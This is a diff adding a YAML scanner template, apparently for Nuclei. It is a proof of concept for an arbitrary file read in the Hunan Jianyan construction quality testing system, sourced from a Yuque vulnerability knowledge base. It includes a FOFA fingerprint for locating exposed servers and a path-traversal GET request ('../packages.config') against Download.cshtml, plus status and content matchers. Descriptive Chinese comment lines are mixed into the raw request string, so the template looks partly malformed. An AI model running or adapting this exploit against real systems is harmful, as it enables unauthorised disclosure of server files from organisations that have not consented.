@@ -1,0 +1,34 @@
+id: poc-slr7w1zbkz4e9i66
+info:
+  name: 湖南建研工程质量检测系统-任意文件读取-Download
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/slr7w1zbkz4e9i66'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: slr7w1zbkz4e9i66
+    fofa: body="/Content/Theme/Standard/"
+http:
+- raw:
+  - 'GET /Applications/Bid/Download.cshtml?file=../packages.config HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    Microsoft.AspNet.WebPages.zh-Hans
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
